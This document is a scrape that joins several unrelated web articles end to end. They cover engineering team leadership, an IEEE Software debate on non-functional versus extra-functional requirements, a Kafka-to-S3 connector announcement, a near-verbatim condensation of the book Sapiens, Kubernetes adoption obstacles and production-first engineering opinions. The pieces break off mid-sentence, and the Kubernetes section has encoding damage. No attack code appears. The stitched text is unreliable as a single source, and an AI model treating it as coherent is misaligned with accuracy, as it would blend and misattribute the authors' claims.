You see a team with satisfied team members :)<br></span></p><h2 id="the-risk"><span>link</span><span>The Risk</span></h2><p><span>Having said all of that there is a short term risk here - you put all your faith and trust on the non senior members to lead critical features and rely mostly on the seniors to help them.<br>
This requires a huge trust in the team and an ability of the team lead to maximize the empowerment of the team members.<br>
I personally really enjoy this step, when you trust your team this way the team feels it. This ability to rely on the team while having long term team building vision is exactly where we grow as engineering managers, but this might be a topic to another blog post :) <br></span></p><p><span>Turning the senior around means to flip the team structure - let the non seniors lead features and make sure the senior members grow them by constant feedback.<br>
This allows strong team building, maximizes everyone's growth and eventually fulfills the two objectives stated at the beginning: delivering on time and supporting our team's professional growth.</span></p></div></div>]]>

                <p>Should our favorite “-ilities” and miscellaneous design/decision drivers be filed under “Non-Functional Requirements” or “Extra-Functional Requirements”? The two editors of IEEE Software Insights do not agree. Read their arguments and decide yourself.</p>

<h3 id="context">Context</h3>

<p>This post has its roots in a somewhat heated, half-serious terminology debate between us<sup id="fnref:1"><a href="#fn:1">1</a></sup> when we reviewed a submission to <a href="https://ozimmer.ch/authoring/2020/06/18/IEEESoftwareInsights.html">Insights</a> recently, our practitioner and experience report column in <a href="https://www.computer.org/csdl/magazine/so">IEEE Software</a>.</p>

<p>In requirements land, features aka functional requirements specify “what” a system is supposed to do (on various levels of refinement and elaboration, for instance identified with user stories and/or elaborated with use cases). And then there is all the rest: <!-- TP quote --></p>

<blockquote>
  <ol>
    <li>The payment requests made during checkout in the (fictitious!) online shop “StayHomeStaySafe.com” should complete in less than three seconds in 80% of the cases.</li>
    <li>Our software should be highly maintainable and evolvable. <!-- not SMART by sample design --></li>
    <li>Due to an Enterprise License Agreement, the relational database management system shall be “TRM Server Version 42.1” from “Delphi Systems”. <!-- this plays with IBM -> HAL --></li>
    <li>Apache 2 and Eclipse are our white-listed open source licenses; the usage of software licensed differently required explicit written approvals by project-external parties including the company-wide architecture board and the legal department.</li>
    <li>The application has to run on existing hardware natively; the operating system must be Ubuntu 16.04.1 LTS. Level 1 and 2 support and systems management will be provided by an already existing (fictitious!) service center “CantReproduceNeedMoreInfo Ltd.”.</li>
  </ol>
</blockquote>

<p>What is the most adequate generic term for such “how” requirements and decision drivers?</p>

<p><strong>Olaf:</strong> The term <em>Non-Functional Requirement (NFR)</em> has been used for a long time.</p>

<p><strong>Cesare:</strong> <em>Extra-Functional Requirements (EFR)</em> is the better term.</p>

<p>Let’s see whether one of us can convince the other to swap one character in his <a href="https://ozimmer.ch/index/2020/10/30/DrivenByTLAs.html">TLA portfolio</a>, or whether there is a place for both terms. We will exchange arguments in a point-counterpoint style.</p>

<h3 id="qualities-and-constraints-not-much-in-common">Qualities and Constraints: Not Much in Common</h3>

<p><strong>Olaf:</strong> Many existing methods and speakers use the term NFR, including <a href="https://www.architecting.co.uk/presentations/NFRs.pdf">Peter Eeles from IBM</a>, <a href="http://www.bredemeyer.com/pdf_files/NonFunctReq.PDF">Ruth Malan and Dana Bredemeyer</a> and <a href="https://www.scaledagileframework.com/nonfunctional-requirements/">SAFe</a>. In my blog post introducing the  <a href="https://ozimmer.ch/practices/2020/10/14/DesignPracticeRepository.html">Design Practice Repository (DPR)</a>, I introduce NFRs as this: “quality attributes certainly are included, but NFRs can also be constraints not related to quality at all”.</p>

<p>The five examples above show how diverse the NFR space is; in <a href="https://ozimmer.ch/practices/2020/09/24/ASRTestECSADecisions.html">another post</a> on this blog, I define 5+2 criteria for the architectural significance of such requirements. In the absence of any strong defining semantics, I do not have a problem with defining by exclusion and using the prefix “non” (which I usually avoid, due to its lack of precision).</p>

<h3 id="qualities-and-constraints-beyond-but-not-functional">Qualities and Constraints: Beyond but Not Functional</h3>

<p><strong>Cesare:</strong> Wait! A requirement for something to be non-functional is a requirement for it not to work, which may be exactly what should happen under some circumstances. So the extra-functional formulation is the more appropriate one.</p>

<p><strong>Olaf:</strong> Extra-functional sounds like an amplification to me, like “super-functional” or “über-functional”, which clearly is counter-intuitive (where are the qualities?). “This is an extra-hard problem” does not come across as “easy to solve” to me. Even worse, “extra” leaves me with a “free skating” impression, but meeting software quality requirements certainly is a duty/liability, not an option.</p>

<p>And I’d use “dys-functional” if I ever had to refer to a requirement for something not to work.</p>

<p><strong>Cesare:</strong> Dys-functional implies that it doesn’t work properly, while if something is non-functional it simply doesn’t work at all.</p>

<p>Let me give an example. During the ongoing pandemic, online supermarkets are usually overloaded due to their limited capacity. To deal with this, they open up delivery slots gradually and do not accept orders unless customers can reserve slots in advance. Once it happened to my surprise: I found lots of available slots and I could get my order submitted, only to discover a few days later that the order had been cancelled and refunded. I received an apology letter stating: “due to the peak in demand, our order submission system should have been non-functional”.</p>

<p>So here we can see that the online supermarket only scales up to its capacity (two extra-functional requirements) and that when full, it should stop accepting orders (a non-functional requirement).</p>

<p><strong>Olaf:</strong> Now I am confused, are you saying that both EFRs and NFRs should be specified? I’d say that “stop accepting orders when condition … holds” is just yet another functional requirement (one about a “rainy day” scenario). When working with <a href="https://www.cs.unb.ca/~wdu/cs6075w10/sa2.htm">Quality Attribute Scenarios</a> to elicit NFRs, for instance, you can specify operating conditions under “environment” and the behavior under “response”. No need for an extra term!</p>

<p><strong>Cesare:</strong> I never said that you should not use the term NFR. The example is meant to illustrate that requirements can exist for a system to be non-functional – like you say, under certain conditions. Would you rather classify the scenario “when it rains, stop working” as a functional requirement or as a requirement for the system to be non functional under a certain condition?</p>

<p><strong>Olaf:</strong> It depends what you mean by “working” here; rejecting requests during a certain period is a behavior of the system that can be observed at its boundary and answers a “what” question rather than “how” questions; a contract for this behavior can be specified and tested against. So it is a functional requirement. We might need another post to clarify what we mean by “functional” before we can discuss “extra” vs. “non” 😉.</p>

<h3 id="quality-attribute-and-requirement-taxonomies">Quality Attribute and Requirement Taxonomies</h3>

<p><strong>Olaf:</strong> I like the <a href="https://www.zora.uzh.ch/id/eprint/7375/">taxonomy by Martin Glinz</a> who specialized on requirements engineering:</p>

<blockquote>
  <p>“A non-functional requirement is an attribute of or a constraint on a system. An attribute is a performance requirement or a specific quality requirement” (categories: reliability, usability, security, availability, portability, maintainability).<sup id="fnref:2"><a href="#fn:2">2</a></sup></p>
</blockquote>

<p><strong>Cesare:</strong> Indeed, the software requirements literature is full of examples of Non-Functional Requirements, but I am not arguing against the past. Those taxonomies of quality attributes are good; I also dedicate one lecture to them in my Software Architecture class, whose <a href="https://leanpub.com/software-architecture/">script is available on LeanPub</a>. They have just been filed under an inappropriate label.</p>

<p><strong>Olaf:</strong> The article specifically distinguishes constraints from qualities, which goes beyond labelling! See the examples above, requirements 3 to 5 in particular.</p>

<p><strong>Cesare:</strong> Would you agree that such platform constraints can be also seen as “Compatibility” or “Portability” requirements (see the “-ilities” figure at the top of this post)?</p>

<p><strong>Olaf:</strong> Some of them can, but not all. Constraints reduce the options in design. Many of them are caused by <a href="https://ozimmer.ch/practices/2020/04/27/ArchitectureDecisionMaking.html">architectural decisions</a> made previously (that I sometimes refer to as “legacy decisions”); they do cover (rather hard) technology choices such as platform selections — but (often softer) organizational aspects as well. So I have a hard time putting all of them in a single quality category. Anyway, which reference supports your position?</p>

<p><strong>Cesare:</strong> I let George Fairbanks speak, p. 246-247 in <a href="https://www.georgefairbanks.com/book/">“Just Enough Software Architecture”</a>:<sup id="fnref:3"><a href="#fn:3">3</a></sup></p>

<blockquote>
  <p>“A quality attribute is a kind of extra-functional requirement, which are also called non-functional requirements and non-functional properties. The term extra-functional is preferred over non-functional because “extra” is more etymologically accurate than “non” in this context — these requirements go beyond functional requirements, not negate them. Most people would interpret a sign saying “non-functional” hanging on a water fountain to mean that it is broken, not that it is high throughput.”</p>
</blockquote>

<p><strong>Olaf:</strong> It is worth noting that George writes “accurate” and not “correct”. But this is just a single author voice, really. One that has weight, I admit that <!-- even George can't get everything right --> 😉.
Martin’s paper, on the other hand, is published in academic conference proceedings.<sup id="fnref:2:1"><a href="#fn:2">2</a></sup></p>

<p><strong>Cesare:</strong> Ok, here’s a peer-reviewed quote:</p>

<blockquote>
  <p>“The term nonfunctional requirement has been used broadly in academic literature and some parts of industry, but it suffers from an unfortunate ambiguity: “nonfunctional” is an actual word that, according to Merriam- Webster’s Collegiate Dictionary (11th edition), means something doesn’t work.”<sup id="fnref:4"><a href="#fn:4">4</a></sup></p>
</blockquote>

<p><strong>Olaf:</strong> That’s a good point.<sup id="fnref:5"><a href="#fn:5">5</a></sup> Authors do not agree… here are two more examples: <a href="https://www.researchgate.net/publication/228883029_The_Process_of_Software_Architecting">“The Process of Architecting”</a> (Peter Eeles/Peter Cripps), for instance, uses NFR: “requirements that include constraints and qualities”; this book generalizes from several industrial methods. We find the term in the <a href="https://en.wikipedia.org/wiki/FURPS">Functionality, Usability, Reliability, Performance, Supportability (FURPS)</a> taxonomy, but not in the <a href="https://iso25000.com/index.php/en/iso-25000-standards/iso-25010">ISO/IEC 25010 quality model</a>. <a href="https://www.viewpoints-and-perspectives.info/home/book/">“Software Systems Architecture”</a> (Nick Rozanski/Eoin Woods) also does not recommend the term NFR but uses “perspectives” instead.</p>

<p><strong>Cesare:</strong> There is also the <a href="http://www.mrtc.mdh.se/ITEQS/2021/">International Workshop on Testing Extra-Functional Properties and Quality Characteristics of Software Systems (ITEQS)</a>, now in its 5th edition.</p>

<p><strong>Olaf:</strong> Yes, but in 2018 they gave the best paper award to a paper titled: “A Testability Analysis Framework for Non-Functional Properties”!</p>

<p>Looks like some more etymology work is in order now.</p>

<h3 id="the-terminology-battle-continues">The Terminology Battle Continues…</h3>

<p><strong>Cesare:</strong> About extra, in addition to amplification (extra-hard but also extra-easy) there are many meanings. See for instance here: <a href="https://www.dictionary.com/browse/extra">https://www.dictionary.com/browse/extra</a>.</p>

<p>So extra in this case would mean “beyond”, “additional”. Performance is an additional requirement going beyond functional correctness. Your software should compute the correct result but also deliver it on time.</p>

<p><strong>Olaf:</strong> Correctness (or accuracy?) actually is a quality. <!-- Martin G also points out that all functional requirements can be seen as qualities, F in FUPRS --> When I talk about functional requirements, I have user stories or use cases in mind that the system under construction supports its end users with. …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Many in the community have been asking us to develop a new Kafka to S3 connector for some time. So we’re pleased to announce it's now available.&nbsp;</p><p>It’s been designed to deliver a number of benefits over existing S3 connectors:</p><ul><li><p> <!-- -->To be completely free and <a target="_blank" href="https://github.com/lensesio/stream-reactor/tree/master/kafka-connect-aws-s3">Open Source</a></p></li><li><p> <!-- -->To allow for optimized data storage (costs) and read-access</p></li><li><p> <!-- -->To make it simpler to manage via GitOps and introduce governance</p></li><li><p> <!-- -->To reduce need for pre-data-processing workloads</p></li><li><p> <!-- -->Efficiently archive data &amp; reduce Kafka platform TCO</p></li></ul><p>Like our other <a href="https://lenses.io/connect/">Stream Reactors</a><u>,</u> the connector extends the standard connect config adding a parameter for a SQL command (Lenses Kafka Connect Query Language or “KCQL”). This defines how to map data from the source (in this case Kafka) to the target (S3).&nbsp;</p><p>Importantly, it also includes how data should be partitioned into S3, the bucket names and the serialization format (support includes JSON, Avro, Parquet, Text, CSV and binary).&nbsp;</p><p>The syntax looks like this:</p><pre>INSERT&nbsp;INTO&nbsp;bucketAddress:pathPrefix&nbsp;</pre><pre></pre><pre>SELECT&nbsp;*&nbsp;</pre><pre></pre><pre>FROM&nbsp;kafka-topic</pre><pre></pre><pre>[PARTITIONBY&nbsp;(partition[,&nbsp;partition]&nbsp;...)]</pre><pre></pre><pre>[STOREAS&nbsp;storage_format]</pre><pre></pre><pre>[WITHPARTITIONER&nbsp;partitioner]</pre><pre></pre><pre>[WITH_FLUSH_SIZE&nbsp;flush_size]</pre><pre></pre><pre>[WITH_FLUSH_INTERVAL&nbsp;flush_interval]</pre><pre></pre><pre>[WITH_FLUSH_COUNT&nbsp;flush_count]</pre><p>Full docs for the syntax can be found <a href="https://docs.lenses.io/4.0/integrations/connectors/stream-reactor/sinks/s3sinkconnector/">here</a>. </p><p>The connector supports a number of different authentication mechanisms to the S3 bucket including standard AWS Credentials (using an access and secret key) and via an <a target="_blank" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html">IAM role for EC2</a>. </p><p>Where credentials are needed, the Lenses <a href="https://docs.lenses.io/4.0/integrations/connectors/secret-providers/">secret manager plugins</a> allow you to integrate with common key management solutions such as Hashicorp Vault and AWS Secret Manager.&nbsp;</p><h2>Increased control &amp; pipeline as code</h2><p>Having control over how the data is structured whilst being sinked allows you to optimize for specific use cases, workloads and read patterns by downstream applications (such as Snowflake or AWS Athena, Glue etc.) and cost. And you avoid having to build and deploy complex stream processing workloads prior to sending to S3.&nbsp;</p><p>Like all Stream Reactor and Kafka Connect connectors, the connector can be managed via your traditional deployment tools and frameworks or can be managed through Lenses. This adds a layer of RBAC, governance, auditing, error handling and monitoring to how to manage Kafka connectors.&nbsp;</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/2ilwBPRzbKXMrVh6ZyOwOT/63686c9c5ba9486b37b32289bcfe57cb/lenses.io_aws_s3_connector_avro_to_parquet_diagram_apache_kafka__1_.png" alt="Lenses.io Apache Kafka Connector for S3 - "></p><p>The whole workload defined as Connect configuration &amp; SQL helps you manage data pipelines as configuration and over <a href="https://lenses.io/blog/2020/09/kafka-gitops-with-dataops/">GitOps</a>.</p><h2>S3 sink walkthrough</h2><p>Let’s assume a scenario where we have records in a Kafka topic <code>backblaze_smart</code> related to manufacturing process failures for certain products and events need to be stored in an S3 bucket.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/XuUivdv6bjSfEHU0GcgR3/2cdac904d91918ccf9c1e95f3c833344/manufaturing_data_failure_events__1_.png" alt="manufacturing data failure events in Lenses.io "></p><p>Downstream analytics solutions (such as AWS Athena) run by different Data teams for each model need access to this data.&nbsp;</p><p>For a read-performance and cost reason, the Data team asks that messages related to each model be partitioned into different objects within the S3 bucket and with a particular naming convention and placed in a <code>manufacturing_failures</code> folder.</p><p>The KCQL we will use in our connector configuration is therefore:</p><p><code>connect.s3.kcql=INSERT&nbsp;INTO&nbsp;Manufacturing:manufacturing_failures&nbsp;SELECT&nbsp;serial_number,&nbsp;model,&nbsp;capacity_bytes,&nbsp;failure&nbsp;FROM&nbsp;backblaze_smart&nbsp;PARTITIONBY&nbsp;model&nbsp;STOREAS&nbsp;`Json`&nbsp;WITH_FLUSH_COUNT&nbsp;=&nbsp;300&nbsp;</code></p><h2>Setting the environment</h2><p>Here's a walkthrough of testing out the connector.

<p>I spent over 25 hours building a cut-down version of Sapiens. The goal? Future-me should be happy to read this once future-me forgets how we evolved. It’s massive for a blog post, just under 30 minutes, but that’s the best I could do, condensing 9 hours worth of material.</p>

<p>I’ve tried to keep editing to a minimum: It’s the original text, edited to ensure it still flows like the book.</p>

<h2 id="development-of-brains">Development of brains</h2>

<p>What caused our brains to develop? We’re not sure.</p>

<p>It doesn’t seem likely. A larger brain needs more energy and thus reduces the chance you’ll survive. Getting more energy meant hunting more.</p>

<p>One contributing factor was the domestication of fire. Fire paved the way for cooking.</p>

<p>Whereas chimpanzees spend 5 hours a day chewing raw food, a single hour suffices for people eating cooked food. The advent of cooking enabled humans to eat more kinds of food, to devote less time to eating, and to make do with smaller teeth and shorter intestines. Some scholars believe there is a direct link between the advent of cooking, the shortening of the human intestinal track, and the growth of the human brain. Since long intestines and large brains are both massive energy consumers, it’s hard to have both. By shortening the intestines and decreasing their energy consumption, cooking inadvertently opened the way to the jumbo brains.</p>

<p>And, we weren’t alone. Competing with us were the Neanderthals, among other species. They were stronger, they had bigger brains, and they could survive the cold. How come, then, did we “win”?</p>

<p>We aren’t sure. The most likely answer is the very thing that makes the debate possible: Homo sapiens conquered the world thanks above all to its unique language.</p>

<h2 id="cognitive-revolution">Cognitive Revolution</h2>

<p>The appearance of new ways of thinking and communicating, between 70,000 and 30,000 years ago, constitutes the Cognitive Revolution. What caused it? We’re not sure. The most commonly believed theory argues that accidental genetic mutations changed the inner wiring of the brains of Sapiens, enabling them to think in unprecedented ways and to communicate using a new type of language. We might call it the Tree of Knowledge mutation.</p>

<!-- 
> All new humans are improvements over the past?
> As in, the de facto keeps rising.

>These mutated humans were praised for their initiative and were more successful
>Till everyone became like this and then even more better humans were praised and the previous became the normal -->

<p>What’s special about our language?</p>

<p>Our language is amazingly supple. We can connect a limited number of sounds and signs to produce an infinite number of sentences, each with a distinct meaning. We can thereby ingest, store and communicate a prodigious amount of information about the surrounding world. A monkey can yell to its comrades, ‘Careful! A lion!’ But a modern human can tell her friends that this morning, near the bend in the river, she saw a lion tracking a herd of bison. She can then describe the exact location, including the different paths leading to the area. With this information, the members of her band can put their heads together and discuss whether they ought to approach the river in order to chase away the lion and hunt the bison.</p>

<!-- Most likely, both the gossip theory (who can be trusted and who can't) and the there-is-a-lion-near-the-river theory are valid.  -->

<p>Yet the truly unique feature of our language is not its ability to transmit information about men and lions. Rather, it’s the ability to transmit information about things that do not exist at all. As far as we know, only Sapiens can talk about entire kinds of entities that they have never seen, touched or smelled.</p>

<!-- The alpha male usually wins his position not because he is physically stronger, but because he leads a large and stable coalition -->

<p>Using language, lots of humans could work together, form a tribe, help each other, and hunt together.</p>

<p>However, communicating with lots of people brings with it new co-ordination problems. The critical threshold for a group interacting together is 150 people.</p>

<!-- But once the threshold of 150 individuals is crossed, things can no longer work that way. You cannot run a division with thousands of soldiers the same way you run a platoon. Successful family businesses usually face a crisis when they grow larger and hire more personnel. If they cannot reinvent themselves, they go bust.  -->

<p>How did Homo sapiens manage to cross this critical threshold, eventually founding cities comprising tens of thousands of inhabitants and empires ruling hundreds of millions? The secret was probably the appearance of fiction. Large numbers of strangers can cooperate successfully by believing in common myths. This is an imagined reality.</p>

<!-- Ever since the Cognitive Revolution, Sapiens has thus been living in a dual reality. On the one hand, the objective reality of rivers, trees and lions; and on the other hand, the imagined reality of gods, nations and corporations.  -->

<!-- As time went by, the imagined reality became ever more powerful, so that today the very survival of rivers, trees and lions depends on the grace of imagined entities such as gods, nations and corporations. -->

<p>Unlike lying, an imagined reality is something that everyone believes in, and as long as this communal belief persists, the imagined reality exerts force in the world.</p>

<p>In other words, while the behaviour patterns of archaic humans remained fixed for tens of thousands of years, Sapiens could transform their social structures, the nature of their interpersonal relations, their economic activities and a host of other behaviours within a decade or two.</p>

<!-- > Because of the cognitive Revolution and the introduction of imagined reality -->

<p>For example, consider trade. Trade cannot exist without trust, and it is very difficult to trust strangers. The global trade network of today is based on our trust in such fictional entities as the dollar, the Federal Reserve Bank, and the totemic trademarks of corporations. When two strangers in a tribal society want to trade, they will often establish trust by appealing to a common god, mythical ancestor or totem animal.</p>

<!-- One on one, even ten on ten, we are embarrassingly similar to chimpanzees. Significant differences begin to appear only when we cross the threshold of 150 individuals, and when we reach 1,000–2,000 individuals, the differences are astounding -->

<!-- The real difference between us and chimpanzees is the mythical glue that binds together large numbers of individuals, families and groups. This glue has made us the masters of creation. -->

<p>Our Tree of Knowledge mutation was significant. However, it’s not just our biology that brought us where we are today.</p>

<ol>
  <li>
    <p>Biology sets the basic parameters for the behaviour and capacities of Homo sapiens. The whole of history takes place within the bounds of this biological arena.</p>
  </li>
  <li>
    <p>This arena is extraordinarily large, allowing Sapiens to play an astounding variety of games. Thanks to their ability to invent fiction, Sapiens create more and more complex games, which each generation develops and elaborates even further</p>
  </li>
  <li>
    <p>Consequently, in order to understand how Sapiens behave, we must describe the historical evolution of their actions.</p>
  </li>
</ol>

<!-- Referring only to our biological constraints would be like a radio sports-caster who, attending the World Cup football championships, offers his listeners a detailed description of the playing field rather than an account of what the players are doing. -->

<!-- There is some evidence that the size of the average Sapiens brain has actually decreased since the age of foraging. Survival in that era required superb mental abilities from everyone. When agriculture and industry came along people could increasingly rely on the skills of others for survival, and new ‘niches for imbeciles’ were opened up. You could survive and pass your unremarkable genes to the next generation by working as a water carrier or an assembly-line worker. -->

<p>The currency of evolution is neither hunger nor pain, but rather copies of DNA helixes. Just as the economic success of a company is measured only by the number of dollars in its bank account, not by the happiness of its employees, so the evolutionary success of a species is measured by the number of copies of its DNA. If no more DNA copies remain, the species is extinct, just as a company without money is bankrupt. If a species boasts many DNA copies, it is a success, and the species flourishes. From such a perspective, 1,000 copies are always better than a hundred copies. This is the essence of the Agricultural Revolution: the ability to keep more people alive under worse conditions.</p>

<p>Rather than heralding a new era of easy living, the Agricultural Revolution left farmers with lives generally more difficult and less satisfying than those of foragers. Hunter-gatherers spent their time in more stimulating and varied ways, and were less in danger of starvation and disease. The Agricultural Revolution certainly enlarged the sum total of food at the disposal of humankind, but the extra food did not translate into a better diet or more leisure. Rather, it translated into population explosions and pampered elites. The average farmer worked harder than the average forager, and got a worse diet in return. The Agricultural Revolution was history’s biggest fraud.</p>

<!-- > The average person in Jericho of 8500 BC lived a harder life than the average person in Jericho of 9500 BC or 13,000 BC. But nobody realised what was happening. Every generation continued to live like the previous generation, making only small improvements here and there in the way things were done. Paradoxically, a series of ‘improvements’, each of which was meant to make life easier, added up to a millstone around the necks of these farmers -->
<!-- 
--- Way of life being lost over generations
    Like with the foundation.
    Also short sightedness.
    As, working harder here meant more food => can better feed children => even more people exist => You're back where you started, except you're working harder.
 -->

<p>Compared to foraging, working a bit harder on the farm meant more food. Settling down on the farm also meant greater freedom to reproduce - you’re not travelling all the time, so you can afford to have more children. This in turn, meant a higher population. And a higher population meant higher food requirements. Thus, the farmers were forced to work even harder.</p>

<p>Why didn’t humans abandon farming when the plan backfired? Partly because it took generations for the small changes to accumulate and transform society and, by then, nobody remembered that they had ever lived differently. And partly because population growth burned humanity’s boats. If the adoption of ploughing increased a village’s population from a hundred to 110, which ten people would have volunteered to starve so that the others could go back to the good old times? There was no going back. The trap snapped shut.</p>

<blockquote>
  <p>One of history’s few iron laws is that luxuries tend to become necessities and spawn new obligations</p>
</blockquote>

<p>This discrepancy between evolutionary success and individual suffering is perhaps the most important lesson we can draw from the Agricultural Revolution. When we study the narrative of plants such as wheat and maize, maybe the purely evolutionary perspective makes sense. Yet in the case of animals such as cattle, sheep and Sapiens, each with a complex world of sensations and emotions, we have to consider how evolutionary success translates into individual experience.</p>

<!-- In the following chapters we will see time and again how a dramatic increase in the collective power and ostensible success of our species went hand in hand with much individual suffering. -->

These are allowing enterprises to boost their time-to-value and enable agility like never before. When we look at Kubernetes projects put in production, the goal of most companies is largely focused on three domains.</p><ul><li>Operations</li><li>Customer service</li><li>Future of the business</li></ul><p>However, the successful adoption and implementation of Kubernetes isnâ€™t straightforward and poses several challenges - from the perspective of developers as well as IT management.</p><p><b>Key obstacles to Kubernetes adoption</b></p><p>The IT department in any enterprise is almost always the most taxed and burnt out. Kubernetes has been found to be adding to this taxation. For most IT developers, the security concerns posed by Kubernetes is the biggest challenge so far. It has also been found that in the event of limited knowledge about the architecture, it also makes it difficult for developers to effectively scale up the applications. The organizations are thus strapped for talent and must provide their employees with training to bridge the gap.</p><p>Another key obstacle to Kubernetesâ€™ adoption is a lack of resources. This lack of resources doesnâ€™t just make the implementation complex but also causes additional stress to the developers. Building cloud-native applications become a stressful job and result in immense project delays. The burnout associated with Kubernetes adoption is so high that it drives developers to look for a new job.</p><p><b>Disruption resulting from the COVID-19 pandemic</b></p><p>In the face of a global pandemic as dangerous as COVID-19, the disruptions have also been felt by developers and IT managers working with Kubernetes. In the last five to six months since the pandemic has wreaked havoc across the world, enterprises have felt a disruptive effect on their operations. The most critical disruptions, in this case, have been project delays, frozen or slowed down hiring, development budgetary cuts, and technology acquisition budgetary cuts.</p></div></section></div>]]>

          <p>Throughout my career, I’ve developed some <em>opinions</em>. Some have worn particularly deep ruts,
reinforced by years of experience. I tried to figure out what these
had in common, and it’s
the idea that <strong>code in production is the only code that matters</strong>. Staging doesn’t
matter, code on your laptop doesn’t matter, QA doesn’t matter,
only production matters. Everything else is debt.</p>

<p>This perspective probably comes from years sitting in between
operations and product development. I strongly
believe that teams should optimize for getting code to production as quickly as
possible as well as responding to incidents in production.</p>

<p>This idea, and a lot of the practices it implies, can be
counter-intuitive or controversial, so I want to dive into them a little
further. What follows is a set of practices and principles I believe are true,
considering my underlying belief that code working in production is the only
code that matters.</p>

<h2 id="engineers-should-operate-their-code">1. Engineers should operate their code.</h2>

<p><strong>Engineers are the subject matter experts for the code they write and should be
responsible for operating it in production</strong>. In this context, “operating” means
deploying, instrumenting, and monitoring code as well as helping to resolve
incidents related to or impacting that code. The responsibility of operating
code aligns incentives - it encourages engineers to write code that is
observable and easy to debug, and connects them to what customers really care
about. It encourages them to be curious about how their code is performing in
production. Importantly, engineers should be on-call for their code - being
on-call creates a positive feedback loop and makes it easier to know if their
efforts in writing production-ready code are paying off. I’ve heard people
complain about the prospect of being on-call, so I’ll just ask this: if you’re
not on-call for your code, who is?</p>

<p>If you’re not currently on-call for your code but want to be, and can help
influence this decision, there are some things you can do. Set up PagerDuty (or
similar) schedules for each group of engineers responsible for specific
services or parts of your code. A good schedule has 6–8 engineers. There are
plenty of variations, but a typical template is to have one-week rotations,
where you’ll be on-call for secondary for a week and then primary for a week.
Configuring alerts is a separate topic, which probably deserves it’s own blog
post entirely, but focus on things that impact your customers (see:
Symptom-based alerting) and remember that you’re ultimately responsible for how
you respond to alerts, which means you can change them.</p>

<p>There are two talks I’d recommend watching that touch on the topic of
configuring alerts: Liz Fong-Jones talks about SLOs in <a href="https://www.youtube.com/watch?v=MT4jbUzEVL0">Cultivating Production Excellence</a> and Aditya Mukerjee does a great job talking about techniques for
managing alerts in <a href="https://vimeo.com/274820572">Warning: This Talk Contains Content Known to the State of California to Reduce Alert Fatigue</a>.</p>

<h2 id="buy-almost-always-beatsbuild">2. Buy Almost Always Beats&nbsp;Build</h2>

<p><strong>If you can avoid building something, you should.</strong> Code is the most expensive
way to solve a problem that isn’t addressing a core area of your business. For
most small to mid-sized companies, there are open source or better yet, hosted
solutions that solve a wide range of common problems. I mean things like git
repository hosting (Github, Gitlab, Bitbucket, etc), observability tooling
(Honeycomb, Lightstep, etc), managed databases (Amazon RDS, Confluent Kafka,
etc), alerting (PagerDuty, OpsGenie, etc) and a whole host of other commodity
technologies. This even applies to your infrastructure - if you can help
it, don’t roll your own Kubernetes clusters (side note: do you even need to use
Kubernetes?), don’t roll your own load balancers if you can use Amazon ELB or
ALBs.</p>

<p>Unfortunately, <a href="https://en.wikipedia.org/wiki/Not_invented_here">NIH</a> syndrome is very real and some companies get burned badly by
this. I’ve seen teams light time and money on fire reinventing components when
better, more battle-tested alternatives exist in the market. Those same teams
almost always end up spending years contending with the resulting technical
debt. If you’re on such a team and have the will and ability to impact change,
start rolling back these decisions one by one. Migrate your databases to a
managed provider, migrate your feature flagging system to a SaaS tool (i.e.
LaunchDarkly). Keep going until the only software you maintain yourselves is
the software that delivers value to your customers. You’ll be much, much better
off for it.</p>

<h2 id="make-deployseasy">3. Make Deploys&nbsp;Easy</h2>

<p>Deploying should be a frequent and unexciting activity. <strong>Engineers should be
able to deploy with minimal manual steps and it should be easy to see if the
deploy is successful</strong> (this requires instrumenting your code for observability,
which - tada - is covered above), and it should be easy to roll back a deploy
if something doesn’t go well. Deploying frequently implies that
deploys are smaller, and smaller deploys are generally easier, faster and
safer.</p>

<p>Many teams implement periods where deploys are forbidden - these can be
referred to as code freezes, or deploy policies like “Don’t deploy on Fridays”.
Having such blackout periods can lead to a pile-up of changes, which increases
the overall risk of something going very wrong.</p>

<p>If you’re on a team that fears deploys, dedicate a percentage of your
engineering time to improvements in your deployment pipeline until the fear is
gone. On a recent team I worked with, we were able to improve deploy times from
3 hours to 30 minutes, which drastically improved the teams’ confidence in the
deploy process. A natural side effect of this was that engineers started
deploying much more frequently instead of waiting for changes to pile up enough
to warrant a “release” (which was synonymous with a deploy).</p>

<p>The book
<a href="https://www.amazon.com/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339">Accelerate</a>
has been getting a lot of attention. If you haven’t read it, I’d recommend it.
The team behind it also publishes the <a href="https://cloud.google.com/devops/">State of DevOps</a>
reports, which are full of well-researched information about what various
companies in the industry are doing. It’s not a coincidence that two of the
four key metrics that the book focuses on are directly related to this (Deploy
Frequency, Change Lead Time). Shipping is <a href="https://www.heavybit.com/library/podcasts/o11ycast/ep-12-speed-of-deployment-with-rich-archbold-of-intercom/">your company’s heartbeat</a>.</p>

<h2 id="trust-the-people-closest-to-theknives">4. Trust the People Closest to the&nbsp;Knives</h2>

<p><strong>The people who work with a system are the ones who understand it best.</strong> This
applies to any part of the socio-technical systems within which we all work. In
the case of software systems, the engineers who deploy every day and are
on-call for critical services understand the level of risk they operate in. A
sad trend is that managers tend to overestimate their teams’ progress on
certain transitions - i.e. cloud-native, DevOps, etc. The higher up the
management chain, the larger this overestimation tends to be. Engineers who
deploy and get paged when things break know where the bodies are buried and
they know what needs the most work. They should, therefore, be the primary
stakeholders responsible for prioritizing technical work.</p>

<p>Another manifestation of this principle applies to platform or services teams.
If you’re responsible for building some shared component that’s used within
your organization (i.e. a messaging system, ci/cd infrastructure, shared
libraries or services) there’s an uncomfortable truth lurking for you: the
people who use your work know more about it than you do in many cases. They
understand implicitly how it serves customers and they know what contortions or
hoops they have to jump through to get it to work. Listen to them for
clues on how to improve the UX of your services and tools.</p>

<h2 id="qa-gates-make-qualityworse">5. QA Gates Make Quality&nbsp;Worse</h2>

<p>Many teams have a manual QA step that gets performed before deploys. The idea,
I guess, is to have someone run automated or manual tests to verify that a set
of changes are ready to be released. This sounds like a comforting
idea - having a human being (or team of human beings) “verify” a release before
it goes out - <strong>but it falls victim to several false assumptions and creates
some misalignments that do more harm than good.</strong></p>

<p>First of all, if there’s manual work that needs to be done before a deploy can
go out, that creates a bottleneck - if you’re making deploys easy, and
deploying small changes frequently, no QA team is going to be able to keep up
